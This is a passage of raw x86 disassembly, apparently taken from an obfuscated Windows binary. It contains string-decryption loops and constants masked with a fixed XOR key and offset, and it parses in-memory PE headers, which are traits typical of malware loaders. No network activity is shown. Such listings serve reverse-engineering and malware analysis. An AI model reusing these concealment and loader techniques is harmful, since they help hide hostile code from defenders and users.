  426ac8:	mov    DWORD PTR [ebp-0x1c],edx
  426acb:	mov    DWORD PTR [ebp-0x8],edi
  426ace:	cmp    edi,ebx
  426ad0:	ja     0x426ad5
  426ad2:	mov    DWORD PTR [ebp-0x8],ebx
  426ad5:	xor    ebx,ebx
  426ad7:	mov    DWORD PTR [ebp-0x18],ebx
  426ada:	cmp    DWORD PTR [ebp-0x8],ebx
  426add:	jbe    0x426b4d
  426adf:	jmp    0x426ae4
  426ae1:	mov    edx,DWORD PTR [ebp-0x1c]
  426ae4:	mov    edi,DWORD PTR [ebp-0x20]
  426ae7:	movzx  edi,WORD PTR [edi+ebx*2]
  426aeb:	cmp    ebx,DWORD PTR [esi+0x18]
  426aee:	jae    0x426b4d
  426af0:	cmp    edi,DWORD PTR [esi+0x14]
  426af3:	jae    0x426b4d
  426af5:	mov    ebx,DWORD PTR [edx+ebx*4]
  426af8:	mov    edx,DWORD PTR [ebp+0x8]
  426afb:	mov    edi,DWORD PTR [ecx+edi*4]
  426afe:	mov    DWORD PTR [ebp-0x4],edx
  426b01:	lea    edx,[ebp-0x50]
  426b04:	add    ebx,eax
  426b06:	add    edi,eax
  426b08:	sub    edx,DWORD PTR [ebp+0x8]
  426b0b:	mov    DWORD PTR [ebp-0x14],0xb
  426b12:	mov    DWORD PTR [ebp-0x24],edx
  426b15:	mov    edx,DWORD PTR [ebp-0x4]
  426b18:	cmp    DWORD PTR [edx],0x0
  426b1b:	jne    0x426b38
  426b1d:	mov    eax,DWORD PTR [ebp-0x24]
  426b20:	push   DWORD PTR [eax+edx*1]
  426b23:	push   ebx
  426b24:	call   0x42691e
  426b29:	mov    ecx,DWORD PTR [ebp-0xc]
  426b2c:	test   eax,eax
  426b2e:	je     0x426b35
  426b30:	mov    eax,DWORD PTR [ebp-0x4]
  426b33:	mov    DWORD PTR [eax],edi
  426b35:	mov    eax,DWORD PTR [ebp-0x10]
  426b38:	add    DWORD PTR [ebp-0x4],0x4
  426b3c:	dec    DWORD PTR [ebp-0x14]
  426b3f:	jne    0x426b15
  426b41:	mov    ebx,DWORD PTR [ebp-0x18]
  426b44:	inc    ebx
  426b45:	mov    DWORD PTR [ebp-0x18],ebx
  426b48:	cmp    ebx,DWORD PTR [ebp-0x8]
  426b4b:	jb     0x426ae1
  426b4d:	pop    esi
  426b4e:	pop    ebx
  426b4f:	pop    edi
  426b50:	leave  
  426b51:	ret    0x4
  426b54:	push   ebp
  426b55:	mov    ebp,esp
  426b57:	mov    eax,DWORD PTR [ebp+0x8]
  426b5a:	push   esi
  426b5b:	push   DWORD PTR [eax+0x1d8]
  426b61:	lea    esi,[eax+0x198]
  426b67:	mov    eax,DWORD PTR [ebp+0x8]
  426b6a:	call   0x426a03
  426b6f:	mov    ecx,DWORD PTR [esi]
  426b71:	mov    DWORD PTR [ecx],eax
  426b73:	mov    eax,DWORD PTR [esi]
  426b75:	xor    ecx,ecx
  426b77:	cmp    DWORD PTR [eax],ecx
  426b79:	pop    esi
  426b7a:	setne  cl
  426b7d:	mov    eax,ecx
  426b7f:	pop    ebp
  426b80:	ret    0x4
  426b83:	mov    ecx,DWORD PTR [edi+0x188]
  426b89:	push   ebx
  426b8a:	jmp    0x426b9f
  426b8c:	xor    eax,0x8a94
  426b91:	add    eax,0x3b56
  426b96:	mov    WORD PTR [ecx],ax
  426b99:	add    ecx,0x2
  426b9c:	add    edx,0x2
  426b9f:	movzx  eax,WORD PTR [edx]
  426ba2:	mov    ebx,0x4e3e
  426ba7:	cmp    ax,bx
  426baa:	jne    0x426b8c
  426bac:	xor    eax,eax
  426bae:	mov    WORD PTR [ecx],ax
  426bb1:	mov    eax,DWORD PTR [edi+0x188]
  426bb7:	pop    ebx
  426bb8:	ret    
  426bb9:	push   edi
  426bba:	mov    edi,eax
  426bbc:	mov    eax,DWORD PTR [esi+0x188]
  426bc2:	shl    edi,0x6
  426bc5:	add    eax,edi
  426bc7:	jmp    0x426bd3
  426bc9:	xor    cl,0x79
  426bcc:	sub    cl,0x3
  426bcf:	mov    BYTE PTR [eax],cl
  426bd1:	inc    eax
  426bd2:	inc    edx
  426bd3:	mov    cl,BYTE PTR [edx]
  426bd5:	cmp    cl,0x7a
  426bd8:	jne    0x426bc9
  426bda:	mov    BYTE PTR [eax],0x0
  426bdd:	mov    eax,DWORD PTR [esi+0x188]
  426be3:	add    eax,edi
  426be5:	pop    edi
  426be6:	ret    
  426be7:	push   ebp
  426be8:	mov    ebp,esp
  426bea:	sub    esp,0x14
  426bed:	mov    DWORD PTR [ebp-0x10],0xf89c85b0
  426bf4:	mov    DWORD PTR [ebp-0x4],0xf89c85b1
  426bfb:	mov    eax,DWORD PTR [ebx]
  426bfd:	mov    DWORD PTR [ebp-0x8],eax
  426c00:	mov    DWORD PTR [ebp-0xc],0xf89c85b8
  426c07:	push   esi
  426c08:	push   edi
  426c09:	mov    DWORD PTR [ebp-0x14],0xead71890
  426c10:	mov    edi,DWORD PTR [ebp-0x4]
  426c13:	mov    ecx,DWORD PTR [ebp-0x10]
  426c16:	mov    eax,0x75108a4
  426c1b:	xor    edi,eax
  426c1d:	mov    edx,0x3272ec
  426c22:	xor    ecx,eax
  426c24:	add    edi,edx
  426c26:	add    ecx,edx
  426c28:	imul   edi,ecx
  426c2b:	jmp    0x426c73
  426c2d:	mov    ecx,DWORD PTR [ebp-0x8]
  426c30:	mov    esi,DWORD PTR [ebp-0x4]
  426c33:	xor    ecx,eax
  426c35:	xor    esi,eax
  426c37:	add    ecx,edx
  426c39:	add    esi,edx
  426c3b:	test   esi,ecx
  426c3d:	mov    esi,DWORD PTR [ebp-0x8]
  426c40:	mov    ecx,DWORD PTR [ebp-0x4]
  426c43:	je     0x426c5a
  426c45:	xor    ecx,eax
  426c47:	xor    esi,eax
  426c49:	add    ecx,edx
  426c4b:	add    esi,edx
  426c4d:	shr    esi,cl
  426c4f:	mov    ecx,DWORD PTR [ebp-0x14]
  426c52:	xor    ecx,eax
  426c54:	add    ecx,edx
  426c56:	xor    esi,ecx
  426c58:	jmp    0x426c64
  426c5a:	xor    esi,eax
  426c5c:	xor    ecx,eax
  426c5e:	add    esi,edx
  426c60:	add    ecx,edx
  426c62:	shr    esi,cl
  426c64:	mov    DWORD PTR [ebp-0x8],esi
  426c67:	mov    ecx,DWORD PTR [ebp-0x4]
  426c6a:	xor    ecx,eax
  426c6c:	lea    edi,[edi+ecx*1+0x3272ec]
  426c73:	mov    ecx,DWORD PTR [ebp-0xc]
  426c76:	mov    esi,DWORD PTR [ebp-0x4]
  426c79:	xor    esi,eax
  426c7b:	xor    ecx,eax
  426c7d:	sub    ecx,esi
  426c7f:	cmp    edi,ecx
  426c81:	jbe    0x426c2d
  426c83:	mov    eax,DWORD PTR [ebp-0x8]
  426c86:	pop    edi
  426c87:	mov    DWORD PTR [ebx],eax
  426c89:	mov    eax,DWORD PTR [ebp-0x8]
  426c8c:	pop    esi
  426c8d:	leave  
  426c8e:	ret    
  426c8f:	push   ebp
  426c90:	mov    ebp,esp
  426c92:	sub    esp,0x38
  426c95:	push   ebx
  426c96:	mov    ebx,0xf89c85b0
  426c9b:	mov    DWORD PTR [ebp-0x4],ebx
  426c9e:	lea    eax,[ebx+0x1]
  426ca1:	push   esi
  426ca2:	mov    DWORD PTR [ebp-0x24],eax
  426ca5:	mov    ecx,DWORD PTR [ebp-0x4]
  426ca8:	mov    edx,DWORD PTR [ebp+0x8]
  426cab:	mov    esi,0x75108a4
  426cb0:	push   edi
  426cb1:	xor    ecx,esi
  426cb3:	mov    edi,0x3272ec
  426cb8:	add    ecx,edi
  426cba:	cmp    edx,ecx
  426cbc:	je     0x426e22
  426cc2:	mov    ecx,DWORD PTR [ebp-0x4]
  426cc5:	mov    edx,DWORD PTR [ebp+0xc]
  426cc8:	xor    ecx,esi
  426cca:	add    ecx,edi
  426ccc:	cmp    edx,ecx
  426cce:	je     0x426e22
  426cd4:	mov    ecx,DWORD PTR [ebp+0x10]
  426cd7:	mov    DWORD PTR [ebp-0x14],ecx
  426cda:	mov    ecx,DWORD PTR [ebp+0xc]
  426cdd:	mov    edx,DWORD PTR [ebp+0x8]
  426ce0:	mov    DWORD PTR [ebp-0x18],0xf89c8533
  426ce7:	mov    DWORD PTR [ebp-0x1c],eax
  426cea:	mov    DWORD PTR [ebp-0x10],ebx
  426ced:	mov    DWORD PTR [ebp+0xc],eax
  426cf0:	mov    DWORD PTR [ebp+0x10],0xf89c85b2
  426cf7:	mov    eax,DWORD PTR [ebp+0xc]
  426cfa:	xor    eax,esi
  426cfc:	mov    DWORD PTR [ebp-0x20],ecx
  426cff:	sub    ecx,eax
  426d01:	sub    ecx,edi
  426d03:	mov    DWORD PTR [ebp+0x8],ecx
  426d06:	mov    DWORD PTR [ebp-0xc],edx
  426d09:	mov    DWORD PTR [ebp-0x8],0xf89c85bd
  426d10:	jmp    0x426e12
  426d15:	mov    eax,DWORD PTR [ebp+0xc]
  426d18:	mov    ecx,DWORD PTR [ebp+0xc]
  426d1b:	xor    eax,esi
  426d1d:	xor    ecx,esi
  426d1f:	lea    ecx,[eax+ecx*1+0x64e5d8]
  426d26:	mov    eax,DWORD PTR [ebp+0x8]
  426d29:	xor    edx,edx
  426d2b:	div    ecx
  426d2d:	mov    eax,DWORD PTR [ebp+0x10]
  426d30:	mov    ecx,DWORD PTR [ebp+0xc]
  426d33:	xor    eax,esi
  426d35:	xor    ecx,esi
  426d37:	sub    eax,ecx
  426d39:	cmp    edx,eax
  426d3b:	jne    0x426dd1
  426d41:	mov    eax,DWORD PTR [ebp+0x8]
  426d44:	mov    ecx,DWORD PTR [ebp-0xc]
  426d47:	mov    dl,BYTE PTR [eax+ecx*1]
  426d4a:	mov    eax,DWORD PTR [ebp-0x10]
  426d4d:	mov    ecx,DWORD PTR [ebp-0x8]
  426d50:	xor    eax,esi
  426d52:	xor    ecx,esi
  426d54:	add    eax,edi
  426d56:	add    ecx,edi
  426d58:	cmp    eax,ecx
  426d5a:	jae    0x426da2
  426d5c:	lea    ecx,[eax-0x3272ec]
  426d62:	mov    DWORD PTR [ebp-0x4],ecx
  426d65:	mov    ebx,DWORD PTR [ebp-0x4]
  426d68:	xor    ebx,esi
  426d6a:	add    ebx,0x7f55d8f2
  426d70:	lea    ecx,[ebp+eax*4-0x38]
  426d74:	mov    DWORD PTR [ecx],ebx
  426d76:	mov    ebx,DWORD PTR [ecx]
  426d78:	cmp    ebx,0x244ecb93
  426d7e:	jbe    0x426d88
  426d80:	add    DWORD PTR [ecx],0x405fcdc
  426d86:	jmp    0x426d8e
  426d88:	add    DWORD PTR [ecx],0xfdaf4324
  426d8e:	mov    ecx,DWORD PTR [ebp-0x8]
  426d91:	xor    ecx,esi
  426d93:	inc    eax
  426d94:	inc    DWORD PTR [ebp-0x4]
  426d97:	add    ecx,edi
  426d99:	cmp    eax,ecx
  426d9b:	jb     0x426d65
  426d9d:	mov    ebx,0xf89c85b0
  426da2:	cmp    DWORD PTR [ebp-0x14],0x0
  426da6:	jne    0x426db0
  426da8:	xor    dl,0x79
  426dab:	sub    dl,0x3
  426dae:	jmp    0x426dc6
  426db0:	mov    eax,DWORD PTR [ebp-0x18]
  426db3:	xor    al,0xa4
  426db5:	mov    cl,0x14
  426db7:	sub    cl,al
  426db9:	add    dl,cl
  426dbb:	mov    ecx,DWORD PTR [ebp-0x1c]
  426dbe:	xor    cl,0xa4
  426dc1:	sub    cl,0x14
  426dc4:	ror    dl,cl
  426dc6:	xor    eax,eax
  426dc8:	mov    eax,DWORD PTR [ebp+0x8]
  426dcb:	mov    ecx,DWORD PTR [ebp-0xc]
  426dce:	mov    BYTE PTR [eax+ecx*1],dl
  426dd1:	mov    eax,DWORD PTR [ebp+0x8]
  426dd4:	mov    ecx,DWORD PTR [ebp-0x10]
  426dd7:	sub    eax,edi
  426dd9:	xor    eax,esi
  426ddb:	cmp    eax,ecx
  426ddd:	jne    0x426e00
  426ddf:	mov    eax,DWORD PTR [ebp+0x10]
  426de2:	mov    ecx,DWORD PTR [ebp+0xc]
  426de5:	xor    eax,esi
  426de7:	xor    ecx,esi
  426de9:	sub    eax,ecx
  426deb:	mov    ecx,DWORD PTR [ebp-0x20]
  426dee:	sub    eax,edi
  426df0:	xor    eax,esi
  426df2:	mov    DWORD PTR [ebp+0x10],eax
  426df5:	mov    eax,DWORD PTR [ebp+0xc]
  426df8:	xor    eax,esi
  426dfa:	sub    ecx,eax
  426dfc:	sub    ecx,edi
  426dfe:	jmp    0x426e0f
  426e00:	mov    eax,DWORD PTR [ebp+0xc]
  426e03:	xor    eax,esi
  426e05:	mov    ecx,0xffcd8d14
  426e0a:	sub    ecx,eax
  426e0c:	add    ecx,DWORD PTR [ebp+0x8]
  426e0f:	mov    DWORD PTR [ebp+0x8],ecx
  426e12:	mov    eax,DWORD PTR [ebp+0x10]
  426e15:	cmp    eax,ebx
  426e17:	jne    0x426d15
  426e1d:	mov    eax,DWORD PTR [ebp-0x24]
  426e20:	jmp    0x426e25
  426e22:	mov    eax,DWORD PTR [ebp-0x4]
  426e25:	xor    eax,esi
  426e27:	add    eax,edi
  426e29:	pop    edi
  426e2a:	pop    esi
  426e2b:	pop    ebx
  426e2c:	leave  
  426e2d:	ret    0xc
  426e30:	push   ebp
  426e31:	mov    ebp,esp
  426e33:	sub    esp,0x420
  426e39:	mov    DWORD PTR [ebp-0x14],0xf89c85b0
  426e40:	mov    DWORD PTR [ebp-0xc],0xf89c85b1
  426e47:	mov    DWORD PTR [ebp-0x18],0xf89c86b0
  426e4e:	push   ebx
  426e4f:	mov    DWORD PTR [ebp-0x1c],0xf89c85b7
  426e56:	mov    eax,DWORD PTR [ebp-0x14]
  426e59:	push   esi
  426e5a:	mov    esi,0x75108a4
  426e5f:	push   edi
  426e60:	xor    eax,esi
  426e62:	mov    edi,0x3272ec
  426e67:	add    eax,edi
  426e69:	mov    DWORD PTR [ebp-0x8],eax
  426e6c:	mov    DWORD PTR [ebp-0x20],0xf89c85b8
  426e73:	mov    DWORD PTR [ebp-0x4],0xead71890
  426e7a:	mov    DWORD PTR [ebp-0x10],0x8
  426e81:	mov    ecx,ecx
  426e83:	mov    eax,DWORD PTR [ebp-0xc]
  426e86:	mov    ecx,DWORD PTR [ebp-0x14]
  426e89:	xor    eax,esi
  426e8b:	xor    ecx,esi
  426e8d:	add    eax,edi
  426e8f:	add    ecx,edi
  426e91:	imul   eax,ecx
  426e94:	jmp    0x426ec7
  426e96:	mov    eax,DWORD PTR [ebp-0x4]
  426e99:	sub    eax,edi
  426e9b:	xor    eax,esi
  426e9d:	mov    DWORD PTR [ebp-0x8],eax
  426ea0:	lea    ebx,[ebp-0x8]
  426ea3:	call   0x426be7
  426ea8:	mov    DWORD PTR [ebp-0x8],eax
  426eab:	mov    eax,DWORD PTR [ebp-0x8]
  426eae:	mov    ecx,DWORD PTR [ebp-0x4]
  426eb1:	mov    DWORD PTR [ebp+ecx*4-0x420],eax
  426eb8:	mov    eax,DWORD PTR [ebp-0xc]
  426ebb:	mov    ecx,DWORD PTR [ebp-0x4]
  426ebe:	xor    eax,esi
  426ec0:	lea    eax,[eax+ecx*1+0x3272ec]
  426ec7:	mov    DWORD PTR [ebp-0x4],eax
  426eca:	mov    eax,DWORD PTR [ebp-0x18]
  426ecd:	mov    ecx,DWORD PTR [ebp-0xc]
  426ed0:	xor    ecx,esi
  426ed2:	xor    eax,esi
  426ed4:	sub    eax,ecx
  426ed6:	mov    ecx,DWORD PTR [ebp-0x4]
  426ed9:	cmp    ecx,eax
  426edb:	jbe    0x426e96
  426edd:	mov    eax,DWORD PTR [ebp-0x1c]
  426ee0:	xor    eax,esi
  426ee2:	add    eax,edi
  426ee4:	mov    DWORD PTR [ebp-0x8],eax
  426ee7:	mov    DWORD PTR [ebp-0x18],0xf89c86b7
  426eee:	mov    ebx,ebx
  426ef0:	jmp    0x426f53
  426ef2:	mov    ecx,DWORD PTR [ebp-0x20]
  426ef5:	mov    eax,DWORD PTR [ebp-0x8]
  426ef8:	xor    ecx,esi
  426efa:	add    ecx,edi
  426efc:	shr    eax,cl
  426efe:	mov    DWORD PTR [ebp-0x4],eax
  426f01:	mov    eax,DWORD PTR [ebp+0x8]
  426f04:	mov    cl,BYTE PTR [eax]
  426f06:	mov    BYTE PTR [ebp+0xb],cl
  426f09:	mov    cl,BYTE PTR [ebp+0xb]
  426f0c:	mov    edx,DWORD PTR [ebp-0x8]
  426f0f:	movzx  ecx,cl
  426f12:	xor    ecx,edx
  426f14:	mov    DWORD PTR [ebp+0x8],ecx
  426f17:	mov    ecx,DWORD PTR [ebp-0x18]
  426f1a:	mov    edx,DWORD PTR [ebp+0x8]
  426f1d:	xor    ecx,esi
  426f1f:	add    ecx,edi
  426f21:	and    ecx,edx
  426f23:	mov    ecx,DWORD PTR [ebp+ecx*4-0x420]
  426f2a:	mov    edx,DWORD PTR [ebp-0x4]
  426f2d:	xor    ecx,edx
  426f2f:	mov    DWORD PTR [ebp-0x8],ecx
  426f32:	mov    ecx,DWORD PTR [ebp-0xc]
  426f35:	xor    ecx,esi
  426f37:	lea    eax,[eax+ecx*1+0x3272ec]
  426f3e:	mov    DWORD PTR [ebp+0x8],eax
  426f41:	mov    eax,DWORD PTR [ebp-0xc]
  426f44:	xor    eax,esi
  426f46:	mov    ecx,0xffcd8d14
  426f4b:	sub    ecx,eax
  426f4d:	add    ecx,DWORD PTR [ebp-0x10]
  426f50:	mov    DWORD PTR [ebp-0x10],ecx
  426f53:	mov    eax,DWORD PTR [ebp-0x14]
  426f56:	mov    ecx,DWORD PTR [ebp-0x10]
  426f59:	xor    eax,esi
  426f5b:	add    eax,edi
  426f5d:	cmp    ecx,eax
  426f5f:	jne    0x426ef2
  426f61:	mov    eax,DWORD PTR [ebp-0x1c]
  426f64:	mov    ecx,DWORD PTR [ebp-0x8]
  426f67:	xor    eax,esi
  426f69:	add    eax,edi
  426f6b:	pop    edi
  426f6c:	pop    esi
  426f6d:	xor    eax,ecx
  426f6f:	pop    ebx
  426f70:	leave  
  426f71:	ret    0x4
  426f74:	push   ebp
  426f75:	mov    ebp,esp
  426f77:	mov    eax,DWORD PTR [ebp+0x1c]
  426f7a:	mov    ecx,DWORD PTR [ebp+0x8]
  426f7d:	mov    edx,DWORD PTR [ebp+0x10]
  426f80:	mov    eax,DWORD PTR [eax+0x190]
  426f86:	mov    eax,DWORD PTR [eax]
  426f88:	sub    esp,0x64
  426f8b:	push   ebx
  426f8c:	push   esi
  426f8d:	push   edi
  426f8e:	mov    edi,0x75108a4
  426f93:	xor    ecx,edi
  426f95:	mov    ebx,0x3272ec
  426f9a:	add    ecx,ebx
  426f9c:	cmp    ecx,edx
  426f9e:	jne    0x426faf
  426fa0:	or     DWORD PTR ds:0x3750c3e,0x4263eb2f
  426faa:	jmp    0x4274ab
  426faf:	mov    ecx,DWORD PTR [ebp+0x8]
  426fb2:	mov    esi,DWORD PTR [ebp+0x14]
  426fb5:	mov    edx,DWORD PTR [esi]
  426fb7:	xor    ecx,edi
  426fb9:	add    ecx,ebx
  426fbb:	cmp    edx,ecx
  426fbd:	je     0x427466
  426fc3:	mov    ecx,DWORD PTR [ebp+0x1c]
  426fc6:	mov    DWORD PTR [ebp-0x1c],eax
  426fc9:	mov    DWORD PTR [ebp+0x1c],ecx
  426fcc:	mov    ecx,DWORD PTR [ebp+0x18]
  426fcf:	mov    eax,DWORD PTR [esi]
  426fd1:	mov    DWORD PTR [ebp-0x20],eax
  426fd4:	mov    DWORD PTR [ebp+0x8],0xf89c85b0
  426fdb:	mov    edx,0xf89c85b1
  426fe0:	mov    DWORD PTR [ebp-0x8],edx
  426fe3:	mov    eax,DWORD PTR [ebp+0x1c]
  426fe6:	mov    DWORD PTR [ebp+0x1c],eax
  426fe9:	mov    eax,DWORD PTR [ebp+0x1c]
  426fec:	mov    eax,DWORD PTR [eax+0x190]
  426ff2:	mov    eax,DWORD PTR [eax]
  426ff4:	mov    DWORD PTR [ebp-0x24],ecx
  426ff7:	mov    ecx,DWORD PTR [ebp+0x1c]
  426ffa:	mov    ecx,DWORD PTR [ecx+0x190]
  427000:	mov    ecx,DWORD PTR [ecx]
  427002:	add    ecx,DWORD PTR [eax+0x3c]
  427005:	mov    DWORD PTR [ebp+0x10],ecx
  427008:	mov    eax,DWORD PTR [ebp+0x8]
  42700b:	xor    eax,edi
  42700d:	add    eax,ebx
  42700f:	mov    DWORD PTR [ebp-0x4],eax
  427012:	mov    eax,DWORD PTR [ebp+0x8]
  427015:	xor    eax,edi
  427017:	add    eax,ebx
  427019:	mov    DWORD PTR [ebp+0x18],eax
  42701c:	mov    eax,DWORD PTR [ebp+0x10]
  42701f:	mov    eax,DWORD PTR [eax+0x50]
  427022:	sub    eax,0xc
  427025:	mov    DWORD PTR [ebp-0x28],eax
  427028:	mov    eax,DWORD PTR [ebp+0x10]
  42702b:	mov    eax,DWORD PTR [eax+0x38]
  42702e:	mov    ecx,DWORD PTR [ebp+0x10]
  427031:	dec    eax
  427032:	test   DWORD PTR [ecx+0x54],eax
  427035:	mov    eax,DWORD PTR [ebp+0x10]
  427038:	je     0x427052
  42703a:	mov    eax,DWORD PTR [eax+0x38]
  42703d:	mov    ecx,DWORD PTR [ebp+0x10]
  427040:	mov    ecx,DWORD PTR [ecx+0x54]
  427043:	dec    eax
  427044:	not    eax
  427046:	and    ecx,eax
  427048:	mov    eax,DWORD PTR [ebp+0x10]
  42704b:	mov    eax,DWORD PTR [eax+0x38]
  42704e:	add    eax,ecx
  427050:	jmp    0x427055
  427052:	mov    eax,DWORD PTR [eax+0x54]
  427055:	mov    DWORD PTR [ebp+0x1c],eax
  427058:	mov    eax,DWORD PTR [ebp+0x8]
  42705b:	xor    eax,edi
  42705d:	add    eax,ebx
  42705f:	mov    DWORD PTR [ebp+0x18],eax
  427062:	mov    eax,DWORD PTR [ebp+0x8]
  427065:	xor    eax,edi
  427067:	add    eax,ebx
  427069:	mov    DWORD PTR [ebp+0x18],eax
  42706c:	mov    eax,DWORD PTR [ebp+0x8]
  42706f:	mov    ecx,DWORD PTR [ebp-0x24]
  427072:	xor    eax,edi
  427074:	add    eax,ebx
  427076:	mov    DWORD PTR [ecx],eax
  427078:	mov    DWORD PTR [ebp+0x18],edx
  42707b:	mov    DWORD PTR [ebp+0x18],0xf89c85b2
  427082:	mov    DWORD PTR [ebp+0x18],0xf89c85b3
  427089:	mov    DWORD PTR [ebp+0x18],0xf89c85bc
  427090:	mov    eax,DWORD PTR [ebp-0x8]
  427093:	mov    ecx,DWORD PTR [ebp+0x1c]
  427096:	xor    eax,edi
  427098:	add    eax,ebx
  42709a:	imul   eax,ecx
  42709d:	mov    ecx,DWORD PTR [ebp+0x8]
  4270a0:	mov    edx,DWORD PTR [ebp-0x28]
  4270a3:	xor    ecx,edi
  4270a5:	lea    ecx,[ecx+edx*1+0x3272ec]
  4270ac:	cmp    eax,ecx
  4270ae:	jae    0x42745f
  4270b4:	mov    eax,DWORD PTR [ebp+0x8]
  4270b7:	xor    eax,edi
  4270b9:	add    eax,ebx
  4270bb:	mov    DWORD PTR [ebp+0x18],eax
  4270be:	mov    eax,DWORD PTR [ebp+0x1c]
  4270c1:	add    eax,DWORD PTR [ebp-0x1c]
  4270c4:	mov    DWORD PTR [ebp-0x4],eax
  4270c7:	push   DWORD PTR [ebp-0x4]
  4270ca:	mov    esi,DWORD PTR [ebp-0x1c]
  4270cd:	mov    ecx,DWORD PTR [ebp+0x10]
  4270d0:	call   0x42621f
  4270d5:	mov    DWORD PTR [ebp+0xc],eax
  4270d8:	mov    DWORD PTR [ebp-0x18],0xf89c85b8
  4270df:	mov    eax,DWORD PTR [ebp-0x18]
  4270e2:	xor    eax,edi
  4270e4:	lea    ecx,[ebp-0x40]
  4270e7:	add    eax,ebx
  4270e9:	push   ecx
  4270ea:	call   0x4267b3
  4270ef:	mov    eax,DWORD PTR [ebp+0xc]
  4270f2:	test   eax,eax
  4270f4:	je     0x427144
  4270f6:	mov    eax,DWORD PTR [ebp-0x18]
  4270f9:	xor    eax,edi
  4270fb:	add    eax,ebx
  4270fd:	push   eax
  4270fe:	push   DWORD PTR [ebp+0xc]
  427101:	lea    eax,[ebp-0x40]
  427104:	push   eax
  427105:	call   0x4266a9
  42710a:	mov    eax,DWORD PTR [ebp-0x4]
  42710d:	mov    DWORD PTR [ebp-0x18],eax
  427110:	mov    eax,DWORD PTR [ebp-0x18]
  427113:	mov    ecx,DWORD PTR [ebp-0x1c]
  427116:	sub    eax,ecx
  427118:	mov    DWORD PTR [ebp-0x18],eax
  42711b:	mov    eax,DWORD PTR [ebp+0xc]
  42711e:	mov    ecx,DWORD PTR [ebp+0xc]
  427121:	mov    eax,DWORD PTR [eax+0x10]
  427124:	add    eax,DWORD PTR [ecx+0xc]
  427127:	mov    ecx,DWORD PTR [ebp-0x18]
  42712a:	cmp    ecx,eax
  42712c:	jb     0x427144
  42712e:	mov    eax,DWORD PTR [ebp+0xc]
  427131:	mov    eax,DWORD PTR [eax+0xc]
  427134:	mov    ecx,DWORD PTR [ebp+0xc]
  427137:	add    eax,DWORD PTR [ecx+0x8]
  42713a:	mov    ecx,DWORD PTR [ebp-0x18]
  42713d:	sub    eax,ecx
  42713f:	jmp    0x427432
  427144:	push   0xc
  427146:	push   DWORD PTR [ebp-0x4]
  427149:	lea    eax,[ebp-0x4c]
  42714c:	push   eax
  42714d:	call   0x4266a9
  427152:	mov    eax,0xf89c85b0
  427157:	mov    DWORD PTR [ebp-0x2c],eax
  42715a:	mov    DWORD PTR [ebp-0x30],0xf89c85b1
  427161:	mov    DWORD PTR [ebp-0x34],0xf89c85b2
  427168:	mov    DWORD PTR [ebp-0x38],0xf89c85b3
  42716f:	lea    ecx,[ebp-0x2c]
  427172:	mov    DWORD PTR [ebp-0xc],ecx
  427175:	lea    ecx,[ebp-0x30]
  427178:	mov    DWORD PTR [ebp-0x10],ecx
  42717b:	lea    ecx,[ebp-0x34]
  42717e:	mov    DWORD PTR [ebp+0xc],ecx
  427181:	lea    ecx,[ebp-0x38]
  427184:	mov    DWORD PTR [ebp-0x14],ecx
  427187:	mov    ecx,DWORD PTR [ebp+0x8]
  42718a:	xor    ecx,edi
  42718c:	add    ecx,ebx
  42718e:	mov    DWORD PTR [ebp-0x18],ecx
  427191:	jmp    0x42738d
  427196:	cmp    eax,0xf89c85b2
  42719b:	je     0x42739f
  4271a1:	mov    ecx,DWORD PTR [ebp-0x8]
  4271a4:	xor    ecx,edi
  4271a6:	mov    esi,eax
  4271a8:	add    ecx,ebx
  4271aa:	mov    DWORD PTR [ebp+0x18],ecx
  4271ad:	mov    eax,DWORD PTR [ebp-0x18]
  4271b0:	xor    esi,edi
  4271b2:	lea    eax,[eax+esi*1+0x3272ec]
  4271b9:	mov    DWORD PTR [ebp-0x18],eax
  4271bc:	mov    eax,DWORD PTR [ebp-0x8]
  4271bf:	mov    ecx,DWORD PTR [ebp-0x18]
  4271c2:	xor    eax,edi
  4271c4:	add    eax,ebx
  4271c6:	cmp    ecx,eax
  4271c8:	jne    0x4271dd
  4271ca:	mov    eax,DWORD PTR [ebp+0x8]
  4271cd:	xor    eax,edi
  4271cf:	add    eax,ebx
  4271d1:	push   eax
  4271d2:	push   0xc
  4271d4:	lea    eax,[ebp-0x4c]
  4271d7:	push   eax
  4271d8:	call   0x426c8f
  4271dd:	mov    eax,DWORD PTR [ebp-0xc]
  4271e0:	mov    eax,DWORD PTR [eax]
  4271e2:	xor    eax,edi
  4271e4:	mov    al,BYTE PTR [ebp+eax*1+0x3272a0]
  4271eb:	mov    ecx,DWORD PTR [ebp+0x8]
  4271ee:	xor    ecx,edi
  4271f0:	movzx  eax,al
  4271f3:	add    ecx,ebx
  4271f5:	cmp    eax,ecx
  4271f7:	je     0x427375
  4271fd:	mov    eax,DWORD PTR [ebp-0x10]
  427200:	mov    eax,DWORD PTR [eax]
  427202:	xor    eax,edi
  427204:	mov    al,BYTE PTR [ebp+eax*1+0x3272a0]
  42720b:	mov    ecx,DWORD PTR [ebp+0x8]
  42720e:	xor    ecx,edi
  427210:	movzx  eax,al
  427213:	add    ecx,ebx
  427215:	cmp    eax,ecx
  427217:	je     0x427375
  42721d:	mov    eax,DWORD PTR [ebp+0xc]
  427220:	mov    eax,DWORD PTR [eax]
  427222:	xor    eax,edi
  427224:	mov    al,BYTE PTR [ebp+eax*1+0x3272a0]
  42722b:	mov    ecx,DWORD PTR [ebp+0x8]
  42722e:	xor    ecx,edi
  427230:	movzx  eax,al
  427233:	add    ecx,ebx
  427235:	cmp    eax,ecx
  427237:	je     0x427375
  42723d:	mov    eax,DWORD PTR [ebp-0x14]
  427240:	mov    eax,DWORD PTR [eax]
  427242:	xor    eax,edi
  427244:	mov    al,BYTE PTR [ebp+eax*1+0x3272a0]
  42724b:	mov    ecx,DWORD PTR [ebp+0x8]
  42724e:	xor    ecx,edi
  427250:	movzx  eax,al
  427253:	add    ecx,ebx
  427255:	cmp    eax,ecx
  427257:	je     0x427375
  42725d:	mov    eax,DWORD PTR [ebp-0x10]
  427260:	mov    eax,DWORD PTR [eax]
  427262:	xor    eax,edi
  427264:	mov    al,BYTE PTR [ebp+eax*1+0x3272a0]
  42726b:	mov    ecx,DWORD PTR [ebp-0xc]
  42726e:	mov    ecx,DWORD PTR [ecx]
  427270:	xor    ecx,edi
  427272:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a0]
  427279:	xor    al,cl
  42727b:	mov    ecx,DWORD PTR [ebp+0xc]
  42727e:	mov    ecx,DWORD PTR [ecx]
  427280:	xor    ecx,edi
  427282:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a0]
  427289:	or     al,cl
